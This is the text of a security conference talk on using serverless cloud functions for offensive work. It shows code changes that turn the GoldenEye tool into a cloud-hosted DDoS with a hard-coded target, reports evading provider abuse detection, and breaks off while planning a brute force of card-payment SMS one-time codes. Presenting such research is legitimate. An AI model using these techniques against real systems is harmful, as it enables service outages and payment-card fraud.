Microservices and FaaS 
for Offensive Security
Ryan Baxendale
$ whoami
Ryan Baxendale
Penetration Tester
Centurion Information Security Pte Ltd - www.centurioninfosec.sg
Singapore
twitter.com/ryancancomputer
github.com/ryanbaxendale
linkedin.com/in/ryanbaxendale 
Servers are dead...
“Serverless”
Jan 2015 - AWS Lambda Preview open to all 
AWS Customers
The stack
Source: https://intl.aliyun.com/forum/read-499
Microservices
Code
Real-time File Processing
https://aws.amazon.com/lambda/
Real-time Stream Processing
https://aws.amazon.com/lambda/
Scale
https://github.com/airbnb/streamalert
StreamAlert is a serverless, realtime data 
analysis framework which empowers you to 
ingest, analyze, and alert on data from any 
environment, using datasources and alerting 
logic you define.
https://github.com/0x4D31/honeyLambda
honeyλ - a simple serverless application 
designed to create and monitor URL 
{honey}tokens, on top of AWS Lambda and 
Amazon API Gateway
https://github.com/goadapp/goad
Goad is an AWS Lambda powered, highly 
distributed, load testing tool built in Go
https://github.com/davbo/lambda-csp-report-uri
Simple python application which runs on AWS 
Lambda and writes CSP reports into S3 for later 
processing
https://github.com/therefromhere/csp_lambda
AWS Lambda function to store Content Security 
Policy reports in ElasticSearch
Automate
https://github.com/marekq/aws-lambda-firewall
Create temporary security groups on your 
EC2 instances through a simple API call. In 
addition, audit your security groups easily by 
the use of automated reports written to S3.
https://github.com/ilijamt/lambda_security_grou
p_manager
Auto managing your AWS security groups 
with Lambda
https://github.com/johnmccuk/cloudflare-ip-security-gr
oup-update
Lambda function to retrieve Cloudflare's IP address 
list and update the specified security group
AWS WAF Automation
https://aws.amazon.com/answers/
security/aws-waf-security-automat
ions/
Parse application logs and trigger 
WAF rules
Honeypot
Log parsing (db scraping)
Use third party IP reputation lists
Hello World from the 
Serverless cloud
Hello Serverless 
World
Hello World on AWS Lambda (1/4)
Hello World on AWS Lambda (2/4)
Hello World on AWS Lambda (3/4)
Hello World on AWS Lambda (4/4)
IP address is 13.228.72.124
Hello Serverless 
World
Hello World on Play with Docker
$ dig +short -x 34.206.199.2
ec2-34-206-199-2.compute-1.amazonaws.com.
+Anonymous (no account)
-time limited
-captcha
Hosted: http://www.play-with-docker.com/
Build your own: https://github.com/alexellis/faas
A serverless framework for Docker
Cost
http://serverlesscalc.com/ 
AWS: “1M free requests per month and 400,000 
GB-seconds of compute time per month”
128 MB = 3,200,000 free seconds per month
Then $0.000000208 per 100ms
10 million executions for $1.80
FaaS support by region
AWS
1.
US East (N. Virginia)
2.
US East (Ohio)
3.
US West (N. California)
4.
US West (Oregon)
5.
Canada (Central)
6.
EU (Ireland)
7.
EU (Frankfurt)
8.
EU (London)
9.
Asia Pacific (Singapore)
10.
Asia Pacific (Sydney)
11.
Asia Pacific (Seoul)
12.
Asia Pacific (Tokyo)
13.
Asia Pacific (Mumbai)
14.
South America (São Paulo)
Azure
1.
East US
2.
East US 2
3.
West US
4.
West US 2
5.
South Central US
6.
North Central US
7.
Central US
8.
Canada Central
9.
Canada East
10.
North Europe
11.
West Europe
12.
UK West
13.
UK South
14.
Southeast Asia
15.
East Asia
16.
Japan West
Azure
17.
Japan East
18.
Brazil South
19.
Australia East
20.
Australia Southeast
22.
Central India
23.
South India
IBM
1.
US South
Google
1.
IOWA (us-central1)
Overview
Google
IBM
AWS
Azure
Regions
1
1
14
23
Language
Node.js
(Python)
Docker
Node.js 6
Python 3
Swift 3
Edge Node.js 4.3
Node.js 4.3
Node.js 6.10
Python 2.7
Python 3.6
Bash, Batch
C#, F#
JavaScript
Php, PowerShell
Python, TypeScript
OS (Python)
Linux
Debian 8.8
Linux
Ubuntu 14.04.1
Linux
4.4.51-40.60.amzn1.x86_64
Windows Server 2012
Advantages
1.
Low cost (“free”)
a.
Sign up credit
2.
Unspecified source IP addresses
a.
Possibly low attribution
3.
Global data centers
a.
China
AWS
IBM Bluemix
Google
Azure
Project Thunderstruck
Finding use cases for FaaS in offensive security
Project Thunderstruck
Finding use cases for FaaS in offensive security
Explore different cloud service providers
Try to get supercomputer resources without 
paying
DEF CON 25
1.
DDoS without Servers
2.
SMS OTP Brute Force
DDoS without 
Servers
1: DDoS without Servers
Client purchases anti-ddos service
Does it work? Will they scrub the attack at 2am?
Plan:
●
Find some DDoS tool/code
●
Port to cloud service provider
●
Trigger based on events
●
Monitor the target and wait for results
    /$$$$$$            /$$       /$$                     /$$$$$$$$                   
   /$$__  $$          | $$      | $$                    | $$_____/                   
  | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$
  | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
  | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
  | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
  |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
   \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                    /$$  | $$         
                                                                   |  $$$$$$/         
                                                                    \______/
GoldenEye - https://github.com/jseidl/GoldenEye
Modified slightly to hard code target IP, Host 
headers, path, and deployed to *undisclosed* 
cloud service provider
Simple script to start the function, wait for it to 
timeout (60 seconds)
Script Kiddie skills
Paste goldeneye.py code
def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)
Remove everything from “# Main” / line 567 
down
goldeneye = GoldenEye("http://128.199.175.83")
goldeneye.useragents = ["Mozilla/5.0 (X11; Linux 
x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
Chrome/59.0.3071.104 Safari/537.36"]
goldeneye.nr_workers = 1
goldeneye.method = METHOD_POST
goldeneye.nr_sockets = 1
goldeneye.fire()
Test on our server
Run the function
Tail logs and wait for results
The attack
Site is still up
Something unexpected has occurred...
Trigger the code to start
Wait for abuse email…
Python
Modify goldeneye to follow redirects
Find in the code (line 336):
                for conn_resp in self.socks:
                    resp = 
conn_resp.getresponse()
Add the following:
if resp.getheader('Location') is not None:
    next_url = resp.getheader('Location')
    (url, headers) = self.createPayload()
    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
    conn_resp.request(method.upper(), next_url, None, headers)
Update the function
Try again...
Monitor the target
AWS Route 53 Health Checks
Checks HTTP service
Can look for keywords
Monitor the target
AWS Route 53 Health Checks
Multiple regions/locations
The Results
~30 Mbps
Code running in 1 region/zone of 1 cloud service provider
Good bandwidth available
Abuse not detected by the cloud service provider and our account is still active :)
Summary
Entry requirements:
●
Anyone who knows how to copy/paste a 
Python script
●
Easy - script kiddie with free credit to cloud 
service providers
Access to:
●
High bandwidth
●
xx Mbps DDoS infrastructure
SMS OTP
Brute force
2: SMS OTP
Online credit card purchases
Access Control Server (ACS):
1.
Is this card enrolled in 3-d secure
2.
Is auth available
3.
Authenticate card holder
ACS has to detect brute force of the OTP value
ACS is run by or on behalf of an Issuer (bank)
https://usa.visa.com/dam/VCOM/download/merchants/verified-by-visa-acquirer-merchant-implementation-guid
e.pdf
Transaction Flow
3-D Secure - Systems and Compliance Testing
Policies and Procedures Guide (January 2014)
Product’s tested: ACS and MPI
“Visa Inc.'s letter of compliance does not under any 
circumstances include any endorsement or 
warranty regarding the ... security ... of any 
particular product or service”
“The ACS determines whether the provided 
password is correct”
“Cardholder fails to correctly enter the 
authentication information within the 
issuer-defined number of entries (possible 
indication of fraudulent user).”
OTP security left to successful implementation of 
ACS by third party product or hosted service
https://usa.visa.com/dam/VCOM/download/merchants/verified-by-visa-acquirer-merchant-implementation-guide.pdf
The Plan
Need to guess 6 digit SMS OTP value
10^6 = 1,000,000 possible values
Time limited window of 100 seconds
Plan:
●
Start a simulated online purchase
●